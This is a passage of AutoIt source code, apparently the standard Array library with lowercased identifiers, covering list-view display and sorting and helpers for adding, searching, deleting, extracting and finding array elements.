				$icolwidth = $icolwidthheader
			EndIf
		Else
			If $icolwidth < $imin_colwidth Then
				GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imin_colwidth)
				$icolwidth = $imin_colwidth
			EndIf
		EndIf
		$iwidth += $icolwidth
		$aicolwidth[$i] = $icolwidth
	Next
	If $iwidth > @DesktopWidth - 100 Then
		$iwidth = $iborder
		For $i = 0 To UBound($aicolwidth) - 1
			If $aicolwidth[$i] > $imax_colwidth Then
				GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imax_colwidth)
				$iwidth += $imax_colwidth
			Else
				$iwidth += $aicolwidth[$i]
			EndIf
		Next
	EndIf
	If $iwidth > @DesktopWidth - 100 Then
		$iwidth = @DesktopWidth - 100
	ElseIf $iwidth < $iminsize Then
		$iwidth = $iminsize
	EndIf
	Local $trect = DllStructCreate("struct; long Left;long Top;long Right;long Bottom; endstruct")
	DllCall("user32.dll", "struct*", "SendMessageW", "hwnd", GUICtrlGetHandle($idlistview), "uint", $_arrayconstant_lvm_getitemrect, "wparam", 0, "struct*", $trect)
	Local $aiwin_pos = WinGetPos($hgui)
	Local $ailv_pos = ControlGetPos($hgui, "", $idlistview)
	$iheight = (($irowindex + 4) * (DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top"))) + $aiwin_pos[3] - $ailv_pos[3]
	If $iheight > @DesktopHeight - 100 Then
		$iheight = @DesktopHeight - 100
	ElseIf $iheight < $iminsize Then
		$iheight = $iminsize
	EndIf
	If $iverbose Then SplashOff()
	GUISetState(@SW_HIDE, $hgui)
	WinMove($hgui, "", (@DesktopWidth - $iwidth) / 2, (@DesktopHeight - $iheight) / 2, $iwidth, $iheight)
	GUISetState(@SW_SHOW, $hgui)
	Local $ioneventmode = Opt("GUIOnEventMode", 0), $imsg
	__arraydisplay_registersortcallback($idlistview, 2, True, "__ArrayDisplay_SortCallBack")
	While 1
		$imsg = GUIGetMsg()
		Switch $imsg
			Case $_arrayconstant_gui_event_close
				ExitLoop
			Case $idcopy_id, $idcopy_data
				Local $isel_count = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getselectedcount, 0, 0)
				If $iverbose AND (NOT $isel_count) AND ($iitem_end - $iitem_start) * ($isubitem_end - $isubitem_start) > 10000 Then
					SplashTextOn($smsgboxtitle, "Copying data" & @CRLF & @CRLF & "Please be patient", 300, 100)
				EndIf
				Local $sclip = "", $sitem, $asplit
				For $i = 0 To GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemcount, 0, 0) - 1
					If $isel_count AND NOT (GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected) <> 0) Then
						ContinueLoop
					EndIf
					$sitem = __arraydisplay_getitemtextstring($idlistview, $i)
					If $imsg = $idcopy_id AND $inorow Then
						$sitem = "Row " & ($i + (($itranspose) ? ($isubitem_start) : ($iitem_start))) & $scurr_separator & $sitem
					EndIf
					If $imsg = $idcopy_data AND NOT $inorow Then
						$sitem = StringRegExpReplace($sitem, "^Row\s\d+\|(.*)$", "$1")
					EndIf
					If $icw_colwidth Then
						$asplit = StringSplit($sitem, $scurr_separator)
						$sitem = ""
						For $j = 1 To $asplit[0]
							$sitem &= StringFormat("%-" & $icw_colwidth + 1 & "s", StringLeft($asplit[$j], $icw_colwidth))
						Next
					Else
						$sitem = StringReplace($sitem, $scurr_separator, $vuser_separator)
					EndIf
					$sclip &= $sitem & @CRLF
				Next
				$sitem = $sheader
				If $imsg = $idcopy_id Then
					$sitem = $sheader
					If $inorow Then
						$sitem = "Row|" & $sitem
					EndIf
					If $icw_colwidth Then
						$asplit = StringSplit($sitem, $scurr_separator)
						$sitem = ""
						For $j = 1 To $asplit[0]
							$sitem &= StringFormat("%-" & $icw_colwidth + 1 & "s", StringLeft($asplit[$j], $icw_colwidth))
						Next
					Else
						$sitem = StringReplace($sitem, $scurr_separator, $vuser_separator)
					EndIf
					$sclip = $sitem & @CRLF & $sclip
				EndIf
				ClipPut($sclip)
				SplashOff()
				GUICtrlSetState($idlistview, $_arrayconstant_gui_focus)
			Case $idlistview
				__arraydisplay_sortitems($idlistview, GUICtrlGetState($idlistview))
			Case $iduser_func
				Local $aiselitems[1] = [0]
				For $i = 0 To GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemcount, 0, 0) - 1
					If (GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected) <> 0) Then
						$aiselitems[0] += 1
						ReDim $aiselitems[$aiselitems[0] + 1]
						$aiselitems[$aiselitems[0]] = $i + $iitem_start
					EndIf
				Next
				$huser_function($aarray, $aiselitems)
				GUICtrlSetState($idlistview, $_arrayconstant_gui_focus)
			Case $idexit_script
				GUIDelete($hgui)
				Exit
		EndSwitch
	WEnd
	GUIDelete($hgui)
	Opt("GUICoordMode", $icoordmode)
	Opt("GUIOnEventMode", $ioneventmode)
	Return 1
EndFunc

Func __arraydisplay_registersortcallback($hwnd, $vcomparetype = 2, $barrows = True, $ssort_callback = "__ArrayDisplay_SortCallBack")
	#Au3Stripper_Ignore_Funcs=$sSort_Callback
	If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $hheader = HWnd(GUICtrlSendMsg($hwnd, 4127, 0, 0))
	$__g_aarraydisplay_sortinfo[1] = $hwnd
	$__g_aarraydisplay_sortinfo[2] = DllCallbackRegister($ssort_callback, "int", "int;int;hwnd")
	$__g_aarraydisplay_sortinfo[3] = -1
	$__g_aarraydisplay_sortinfo[4] = -1
	$__g_aarraydisplay_sortinfo[5] = 1
	$__g_aarraydisplay_sortinfo[6] = -1
	$__g_aarraydisplay_sortinfo[7] = 0
	$__g_aarraydisplay_sortinfo[8] = $vcomparetype
	$__g_aarraydisplay_sortinfo[9] = $barrows
	$__g_aarraydisplay_sortinfo[10] = $hheader
	Return $__g_aarraydisplay_sortinfo[2] <> 0
EndFunc

#Au3Stripper_Ignore_Funcs=__ArrayDisplay_SortCallBack

Func __arraydisplay_sortcallback($nitem1, $nitem2, $hwnd)
	If $__g_aarraydisplay_sortinfo[3] = $__g_aarraydisplay_sortinfo[4] Then
		If NOT $__g_aarraydisplay_sortinfo[7] Then
			$__g_aarraydisplay_sortinfo[5] *= -1
			$__g_aarraydisplay_sortinfo[7] = 1
		EndIf
	Else
		$__g_aarraydisplay_sortinfo[7] = 1
	EndIf
	$__g_aarraydisplay_sortinfo[6] = $__g_aarraydisplay_sortinfo[3]
	Local $sval1 = __arraydisplay_getitemtext($hwnd, $nitem1, $__g_aarraydisplay_sortinfo[3])
	Local $sval2 = __arraydisplay_getitemtext($hwnd, $nitem2, $__g_aarraydisplay_sortinfo[3])
	If $__g_aarraydisplay_sortinfo[8] = 1 Then
		If (StringIsFloat($sval1) OR StringIsInt($sval1)) Then $sval1 = Number($sval1)
		If (StringIsFloat($sval2) OR StringIsInt($sval2)) Then $sval2 = Number($sval2)
	EndIf
	Local $nresult
	If $__g_aarraydisplay_sortinfo[8] < 2 Then
		$nresult = 0
		If $sval1 < $sval2 Then
			$nresult = -1
		ElseIf $sval1 > $sval2 Then
			$nresult = 1
		EndIf
	Else
		$nresult = DllCall("shlwapi.dll", "int", "StrCmpLogicalW", "wstr", $sval1, "wstr", $sval2)[0]
	EndIf
	$nresult = $nresult * $__g_aarraydisplay_sortinfo[5]
	Return $nresult
EndFunc

Func __arraydisplay_sortitems($hwnd, $icol)
	If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $pfunction = DllCallbackGetPtr($__g_aarraydisplay_sortinfo[2])
	$__g_aarraydisplay_sortinfo[3] = $icol
	$__g_aarraydisplay_sortinfo[7] = 0
	$__g_aarraydisplay_sortinfo[4] = $__g_aarraydisplay_sortinfo[6]
	Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 4177, "hwnd", $hwnd, "ptr", $pfunction)
	If $aresult[0] <> 0 Then
		If $__g_aarraydisplay_sortinfo[9] Then
			Local $hheader = $__g_aarraydisplay_sortinfo[10], $iformat
			For $x = 0 To __arraydisplay_getitemcount($hheader) - 1
				$iformat = __arraydisplay_getitemformat($hheader, $x)
				If BitAND($iformat, 512) Then
					__arraydisplay_setitemformat($hheader, $x, BitXOR($iformat, 512))
				ElseIf BitAND($iformat, 1024) Then
					__arraydisplay_setitemformat($hheader, $x, BitXOR($iformat, 1024))
				EndIf
			Next
			$iformat = __arraydisplay_getitemformat($hheader, $icol)
			If $__g_aarraydisplay_sortinfo[5] = 1 Then
				__arraydisplay_setitemformat($hheader, $icol, BitOR($iformat, 1024))
			Else
				__arraydisplay_setitemformat($hheader, $icol, BitOR($iformat, 512))
			EndIf
		EndIf
		Return True
	EndIf
	Return False
EndFunc

Func __arraydisplay_additem($hwnd, $stext)
	Local $titem = DllStructCreate($_arrayconstant_taglvitem)
	DllStructSetData($titem, "Param", 0)
	Local $ibuffer = StringLen($stext) + 1
	Local $tbuffer = DllStructCreate("wchar Text[" & $ibuffer & "]")
	$ibuffer *= 2
	DllStructSetData($tbuffer, "Text", $stext)
	DllStructSetData($titem, "Text", DllStructGetPtr($tbuffer))
	DllStructSetData($titem, "TextMax", $ibuffer)
	Local $imask = 5
	DllStructSetData($titem, "Mask", $imask)
	DllStructSetData($titem, "Item", 999999999)
	DllStructSetData($titem, "Image", -1)
	Local $pitem = DllStructGetPtr($titem)
	Local $iret = GUICtrlSendMsg($hwnd, 4173, 0, $pitem)
	Return $iret
EndFunc

Func __arraydisplay_addsubitem($hwnd, $iindex, $stext, $isubitem)
	Local $ibuffer = StringLen($stext) + 1
	Local $tbuffer = DllStructCreate("wchar Text[" & $ibuffer & "]")
	$ibuffer *= 2
	Local $pbuffer = DllStructGetPtr($tbuffer)
	Local $titem = DllStructCreate($_arrayconstant_taglvitem)
	Local $imask = 1
	DllStructSetData($tbuffer, "Text", $stext)
	DllStructSetData($titem, "Mask", $imask)
	DllStructSetData($titem, "Item", $iindex)
	DllStructSetData($titem, "SubItem", $isubitem)
	DllStructSetData($titem, "Image", -1)
	Local $pitem = DllStructGetPtr($titem)
	DllStructSetData($titem, "Text", $pbuffer)
	Local $iret = GUICtrlSendMsg($hwnd, 4172, 0, $pitem)
	Return $iret <> 0
EndFunc

Func __arraydisplay_getcolumncount($hwnd)
	Local $hheader = HWnd(GUICtrlSendMsg($hwnd, 4127, 0, 0))
	Return __arraydisplay_getitemcount($hheader)
EndFunc

Func __arraydisplay_getheader($hwnd)
	Return HWnd(GUICtrlSendMsg($hwnd, 4127, 0, 0))
EndFunc

Func __arraydisplay_getitem($hwnd, $iindex, ByRef $titem)
	Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 4619, "wparam", $iindex, "struct*", $titem)
	Return $aresult[0] <> 0
EndFunc

Func __arraydisplay_getitemcount($hwnd)
	Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 4608, "wparam", 0, "lparam", 0)
	Return $aresult[0]
EndFunc

Func __arraydisplay_getitemformat($hwnd, $iindex)
	Local $titem = DllStructCreate($_arrayconstant_taghditem)
	DllStructSetData($titem, "Mask", 4)
	__arraydisplay_getitem($hwnd, $iindex, $titem)
	Return DllStructGetData($titem, "Fmt")
EndFunc

Func __arraydisplay_getitemtext($hwnd, $iindex, $isubitem = 0)
	Local $tbuffer = DllStructCreate("wchar Text[4096]")
	Local $pbuffer = DllStructGetPtr($tbuffer)
	Local $titem = DllStructCreate($_arrayconstant_taglvitem)
	DllStructSetData($titem, "SubItem", $isubitem)
	DllStructSetData($titem, "TextMax", 4096)
	DllStructSetData($titem, "Text", $pbuffer)
	If IsHWnd($hwnd) Then
		DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 4211, "wparam", $iindex, "struct*", $titem)
	Else
		Local $pitem = DllStructGetPtr($titem)
		GUICtrlSendMsg($hwnd, 4211, $iindex, $pitem)
	EndIf
	Return DllStructGetData($tbuffer, "Text")
EndFunc

Func __arraydisplay_getitemtextstring($hwnd, $iitem)
	Local $srow = "", $sseparatorchar = Opt("GUIDataSeparatorChar")
	Local $iselected = $iitem
	For $x = 0 To __arraydisplay_getcolumncount($hwnd) - 1
		$srow &= __arraydisplay_getitemtext($hwnd, $iselected, $x) & $sseparatorchar
	Next
	Return StringTrimRight($srow, 1)
EndFunc

Func __arraydisplay_justifycolumn($idlistview, $iindex, $ialign = -1)
	Local $tcolumn = DllStructCreate("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
	If $ialign < 0 OR $ialign > 2 Then $ialign = 0
	DllStructSetData($tcolumn, "Mask", 1)
	DllStructSetData($tcolumn, "Fmt", $ialign)
	Local $pcolumn = DllStructGetPtr($tcolumn)
	Local $iret = GUICtrlSendMsg($idlistview, 4192, $iindex, $pcolumn)
	Return $iret <> 0
EndFunc

Func __arraydisplay_setitemformat($hwnd, $iindex, $iformat)
	Local $titem = DllStructCreate($_arrayconstant_taghditem)
	DllStructSetData($titem, "Mask", 4)
	DllStructSetData($titem, "Fmt", $iformat)
	Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 4620, "wparam", $iindex, "struct*", $titem)
	Return $aresult[0] <> 0
EndFunc

Global Enum $arrayfill_force_default, $arrayfill_force_singleitem, $arrayfill_force_int, $arrayfill_force_number, $arrayfill_force_ptr, $arrayfill_force_hwnd, $arrayfill_force_string, $arrayfill_force_boolean
Global Enum $arrayunique_nocount, $arrayunique_count
Global Enum $arrayunique_auto, $arrayunique_force32, $arrayunique_force64, $arrayunique_match, $arrayunique_distinct

Func _arrayadd(ByRef $aarray, $vvalue, $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
	If $istart = Default Then $istart = 0
	If $sdelim_item = Default Then $sdelim_item = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $iforce = Default Then $iforce = $arrayfill_force_default
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	Local $hdatatype = 0
	Switch $iforce
		Case $arrayfill_force_int
			$hdatatype = Int
		Case $arrayfill_force_number
			$hdatatype = Number
		Case $arrayfill_force_ptr
			$hdatatype = Ptr
		Case $arrayfill_force_hwnd
			$hdatatype = HWnd
		Case $arrayfill_force_string
			$hdatatype = String
		Case $arrayfill_force_boolean
			$hdatatype = "Boolean"
	EndSwitch
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $iforce = $arrayfill_force_singleitem Then
				ReDim $aarray[$idim_1 + 1]
				$aarray[$idim_1] = $vvalue
				Return $idim_1
			EndIf
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 1 Then Return SetError(5, 0, -1)
				$hdatatype = 0
			Else
				Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
				If UBound($atmp, $ubound_rows) = 1 Then
					$atmp[0] = $vvalue
				EndIf
				$vvalue = $atmp
			EndIf
			Local $iadd = UBound($vvalue, $ubound_rows)
			ReDim $aarray[$idim_1 + $iadd]
			For $i = 0 To $iadd - 1
				If String($hdatatype) = "Boolean" Then
					Switch $vvalue[$i]
						Case "True", "1"
							$aarray[$idim_1 + $i] = True
						Case "False", "0", ""
							$aarray[$idim_1 + $i] = False
					EndSwitch
				ElseIf IsFunc($hdatatype) Then
					$aarray[$idim_1 + $i] = $hdatatype($vvalue[$i])
				Else
					$aarray[$idim_1 + $i] = $vvalue[$i]
				EndIf
			Next
			Return $idim_1 + $iadd - 1
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $istart < 0 OR $istart > $idim_2 - 1 Then Return SetError(4, 0, -1)
			Local $ivaldim_1, $ivaldim_2 = 0, $icolcount
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 2 Then Return SetError(5, 0, -1)
				$ivaldim_1 = UBound($vvalue, $ubound_rows)
				$ivaldim_2 = UBound($vvalue, $ubound_columns)
				$hdatatype = 0
			Else
				Local $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
				$ivaldim_1 = UBound($asplit_1, $ubound_rows)
				Local $atmp[$ivaldim_1][0], $asplit_2
				For $i = 0 To $ivaldim_1 - 1
					$asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
					$icolcount = UBound($asplit_2)
					If $icolcount > $ivaldim_2 Then
						$ivaldim_2 = $icolcount
						ReDim $atmp[$ivaldim_1][$ivaldim_2]
					EndIf
					For $j = 0 To $icolcount - 1
						$atmp[$i][$j] = $asplit_2[$j]
					Next
				Next
				$vvalue = $atmp
			EndIf
			If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(3, 0, -1)
			ReDim $aarray[$idim_1 + $ivaldim_1][$idim_2]
			For $iwriteto_index = 0 To $ivaldim_1 - 1
				For $j = 0 To $idim_2 - 1
					If $j < $istart Then
						$aarray[$iwriteto_index + $idim_1][$j] = ""
					ElseIf $j - $istart > $ivaldim_2 - 1 Then
						$aarray[$iwriteto_index + $idim_1][$j] = ""
					Else
						If String($hdatatype) = "Boolean" Then
							Switch $vvalue[$iwriteto_index][$j - $istart]
								Case "True", "1"
									$aarray[$iwriteto_index + $idim_1][$j] = True
								Case "False", "0", ""
									$aarray[$iwriteto_index + $idim_1][$j] = False
							EndSwitch
						ElseIf IsFunc($hdatatype) Then
							$aarray[$iwriteto_index + $idim_1][$j] = $hdatatype($vvalue[$iwriteto_index][$j - $istart])
						Else
							$aarray[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $istart]
						EndIf
					EndIf
				Next
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_rows) - 1
EndFunc

Func _arraybinarysearch(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icolumn = 0)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icolumn = Default Then $icolumn = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If $idim_1 = 0 Then Return SetError(6, 0, -1)
	If $iend < 1 OR $iend > $idim_1 - 1 Then $iend = $idim_1 - 1
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $imid = Int(($iend + $istart) / 2)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $aarray[$istart] > $vvalue OR $aarray[$iend] < $vvalue Then Return SetError(2, 0, -1)
			While $istart <= $imid AND $vvalue <> $aarray[$imid]
				If $vvalue < $aarray[$imid] Then
					$iend = $imid - 1
				Else
					$istart = $imid + 1
				EndIf
				$imid = Int(($iend + $istart) / 2)
			WEnd
			If $istart > $iend Then Return SetError(3, 0, -1)
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $icolumn < 0 OR $icolumn > $idim_2 Then Return SetError(7, 0, -1)
			If $aarray[$istart][$icolumn] > $vvalue OR $aarray[$iend][$icolumn] < $vvalue Then Return SetError(2, 0, -1)
			While $istart <= $imid AND $vvalue <> $aarray[$imid][$icolumn]
				If $vvalue < $aarray[$imid][$icolumn] Then
					$iend = $imid - 1
				Else
					$istart = $imid + 1
				EndIf
				$imid = Int(($iend + $istart) / 2)
			WEnd
			If $istart > $iend Then Return SetError(3, 0, -1)
		Case Else
			Return SetError(5, 0, -1)
	EndSwitch
	Return $imid
EndFunc

Func _arraycoldelete(ByRef $aarray, $icolumn, $bconvert = False)
	If $bconvert = Default Then $bconvert = False
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If UBound($aarray, $ubound_dimensions) <> 2 Then Return SetError(2, 0, -1)
	Local $idim_2 = UBound($aarray, $ubound_columns)
	Switch $idim_2
		Case 2
			If $icolumn < 0 OR $icolumn > 1 Then Return SetError(3, 0, -1)
			If $bconvert Then
				Local $atemparray[$idim_1]
				For $i = 0 To $idim_1 - 1
					$atemparray[$i] = $aarray[$i][(NOT $icolumn)]
				Next
				$aarray = $atemparray
			Else
				ContinueCase
			EndIf
		Case Else
			If $icolumn < 0 OR $icolumn > $idim_2 - 1 Then Return SetError(3, 0, -1)
			For $i = 0 To $idim_1 - 1
				For $j = $icolumn To $idim_2 - 2
					$aarray[$i][$j] = $aarray[$i][$j + 1]
				Next
			Next
			ReDim $aarray[$idim_1][$idim_2 - 1]
	EndSwitch
	Return UBound($aarray, $ubound_columns)
EndFunc

Func _arraycolinsert(ByRef $aarray, $icolumn)
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			Local $atemparray[$idim_1][2]
			Switch $icolumn
				Case 0, 1
					For $i = 0 To $idim_1 - 1
						$atemparray[$i][(NOT $icolumn)] = $aarray[$i]
					Next
				Case Else
					Return SetError(3, 0, -1)
			EndSwitch
			$aarray = $atemparray
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $icolumn < 0 OR $icolumn > $idim_2 Then Return SetError(3, 0, -1)
			ReDim $aarray[$idim_1][$idim_2 + 1]
			For $i = 0 To $idim_1 - 1
				For $j = $idim_2 To $icolumn + 1 Step -1
					$aarray[$i][$j] = $aarray[$i][$j - 1]
				Next
				$aarray[$i][$icolumn] = ""
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_columns)
EndFunc

Func _arraycombinations(Const ByRef $aarray, $iset, $sdelimiter = "")
	If $sdelimiter = Default Then $sdelimiter = ""
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, 0)
	Local $in = UBound($aarray)
	Local $ir = $iset
	Local $aidx[$ir]
	For $i = 0 To $ir - 1
		$aidx[$i] = $i
	Next
	Local $itotal = __array_combinations($in, $ir)
	Local $ileft = $itotal
	Local $aresult[$itotal + 1]
	$aresult[0] = $itotal
	Local $icount = 1
	While $ileft > 0
		__array_getnext($in, $ir, $ileft, $itotal, $aidx)
		For $i = 0 To $iset - 1
			$aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
		Next
		If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 1)
		$icount += 1
	WEnd
	Return $aresult
EndFunc

Func _arrayconcatenate(ByRef $aarraytarget, Const ByRef $aarraysource, $istart = 0)
	If $istart = Default Then $istart = 0
	If NOT IsArray($aarraytarget) Then Return SetError(1, 0, -1)
	If NOT IsArray($aarraysource) Then Return SetError(2, 0, -1)
	Local $idim_total_tgt = UBound($aarraytarget, $ubound_dimensions)
	Local $idim_total_src = UBound($aarraysource, $ubound_dimensions)
	Local $idim_1_tgt = UBound($aarraytarget, $ubound_rows)
	Local $idim_1_src = UBound($aarraysource, $ubound_rows)
	If $istart < 0 OR $istart > $idim_1_src - 1 Then Return SetError(6, 0, -1)
	Switch $idim_total_tgt
		Case 1
			If $idim_total_src <> 1 Then Return SetError(4, 0, -1)
			ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart]
			For $i = $istart To $idim_1_src - 1
				$aarraytarget[$idim_1_tgt + $i - $istart] = $aarraysource[$i]
			Next
		Case 2
			If $idim_total_src <> 2 Then Return SetError(4, 0, -1)
			Local $idim_2_tgt = UBound($aarraytarget, $ubound_columns)
			If UBound($aarraysource, $ubound_columns) <> $idim_2_tgt Then Return SetError(5, 0, -1)
			ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart][$idim_2_tgt]
			For $i = $istart To $idim_1_src - 1
				For $j = 0 To $idim_2_tgt - 1
					$aarraytarget[$idim_1_tgt + $i - $istart][$j] = $aarraysource[$i][$j]
				Next
			Next
		Case Else
			Return SetError(3, 0, -1)
	EndSwitch
	Return UBound($aarraytarget, $ubound_rows)
EndFunc

Func _arraydelete(ByRef $aarray, $vrange)
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If IsArray($vrange) Then
		If UBound($vrange, $ubound_dimensions) <> 1 OR UBound($vrange, $ubound_rows) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $inumber, $asplit_1, $asplit_2
		$vrange = StringStripWS($vrange, 8)
		$asplit_1 = StringSplit($vrange, ";")
		$vrange = ""
		For $i = 1 To $asplit_1[0]
			If NOT StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$asplit_2 = StringSplit($asplit_1[$i], "-")
			Switch $asplit_2[0]
				Case 1
					$vrange &= $asplit_2[1] & ";"
				Case 2
					If Number($asplit_2[2]) >= Number($asplit_2[1]) Then
						$inumber = $asplit_2[1] - 1
						Do
							$inumber += 1
							$vrange &= $inumber & ";"
						Until $inumber = $asplit_2[2]
					EndIf
			EndSwitch
		Next
		$vrange = StringSplit(StringTrimRight($vrange, 1), ";")
	EndIf
	If $vrange[1] < 0 OR $vrange[$vrange[0]] > $idim_1 Then Return SetError(5, 0, -1)
	Local $icopyto_index = 0
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = 1 To $vrange[0]
				$aarray[$vrange[$i]] = ChrW(64177)
			Next
			For $ireadfrom_index = 0 To $idim_1
				If $aarray[$ireadfrom_index] == ChrW(64177) Then
					ContinueLoop
				Else
					If $ireadfrom_index <> $icopyto_index Then
						$aarray[$icopyto_index] = $aarray[$ireadfrom_index]
					EndIf
					$icopyto_index += 1
				EndIf
			Next
			ReDim $aarray[$idim_1 - $vrange[0] + 1]
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			For $i = 1 To $vrange[0]
				$aarray[$vrange[$i]][0] = ChrW(64177)
			Next
			For $ireadfrom_index = 0 To $idim_1
				If $aarray[$ireadfrom_index][0] == ChrW(64177) Then
					ContinueLoop
				Else
					If $ireadfrom_index <> $icopyto_index Then
						For $j = 0 To $idim_2
							$aarray[$icopyto_index][$j] = $aarray[$ireadfrom_index][$j]
						Next
					EndIf
					$icopyto_index += 1
				EndIf
			Next
			ReDim $aarray[$idim_1 - $vrange[0] + 1][$idim_2 + 1]
		Case Else
			Return SetError(2, 0, False)
	EndSwitch
	Return UBound($aarray, $ubound_rows)
EndFunc

Func _arraydisplay(Const ByRef $aarray, $stitle = Default, $sarrayrange = Default, $iflags = Default, $vuser_separator = Default, $sheader = Default, $imax_colwidth = Default)
	#forceref $vUser_Separator
	Local $iret = __arraydisplay_share($aarray, $stitle, $sarrayrange, $iflags, Default, $sheader, $imax_colwidth, 0, False)
	Return SetError(@error, @extended, $iret)
EndFunc

Func _arrayextract(Const ByRef $aarray, $istart_row = -1, $iend_row = -1, $istart_col = -1, $iend_col = -1)
	If $istart_row = Default Then $istart_row = -1
	If $iend_row = Default Then $iend_row = -1
	If $istart_col = Default Then $istart_col = -1
	If $iend_col = Default Then $iend_col = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $iend_row = -1 Then $iend_row = $idim_1
	If $istart_row = -1 Then $istart_row = 0
	If $istart_row < -1 OR $iend_row < -1 Then Return SetError(3, 0, -1)
	If $istart_row > $idim_1 OR $iend_row > $idim_1 Then Return SetError(3, 0, -1)
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			Local $aretarray[$iend_row - $istart_row + 1]
			For $i = 0 To $iend_row - $istart_row
				$aretarray[$i] = $aarray[$i + $istart_row]
			Next
			Return $aretarray
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $iend_col = -1 Then $iend_col = $idim_2
			If $istart_col = -1 Then $istart_col = 0
			If $istart_col < -1 OR $iend_col < -1 Then Return SetError(5, 0, -1)
			If $istart_col > $idim_2 OR $iend_col > $idim_2 Then Return SetError(5, 0, -1)
			If $istart_col > $iend_col Then Return SetError(6, 0, -1)
			If $istart_col = $iend_col Then
				Local $aretarray[$iend_row - $istart_row + 1]
			Else
				Local $aretarray[$iend_row - $istart_row + 1][$iend_col - $istart_col + 1]
			EndIf
			For $i = 0 To $iend_row - $istart_row
				For $j = 0 To $iend_col - $istart_col
					If $istart_col = $iend_col Then
						$aretarray[$i] = $aarray[$i + $istart_row][$j + $istart_col]
					Else
						$aretarray[$i][$j] = $aarray[$i + $istart_row][$j + $istart_col]
					EndIf
				Next
			Next
			Return $aretarray
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arrayfindall(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $isubitem = 0, $brow = False)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icase = Default Then $icase = 0
	If $icompare = Default Then $icompare = 0
	If $isubitem = Default Then $isubitem = 0
	If $brow = Default Then $brow = False
	$istart = _arraysearch($aarray, $vvalue, $istart, $iend, $icase, $icompare, 1, $isubitem, $brow)
	If @error Then Return SetError(@error, 0, -1)
	Local $iindex = 0, $avresult[UBound($aarray, ($brow ? $ubound_columns : $ubound_rows))]
	Do
		$avresult[$iindex] = $istart
		$iindex += 1
		$istart = _arraysearch($aarray, $vvalue, $istart + 1, $iend, $icase, $icompare, 1, $isubitem, $brow)
	Until @error
	ReDim $avresult[$iindex]
	Return $avresult
EndFunc

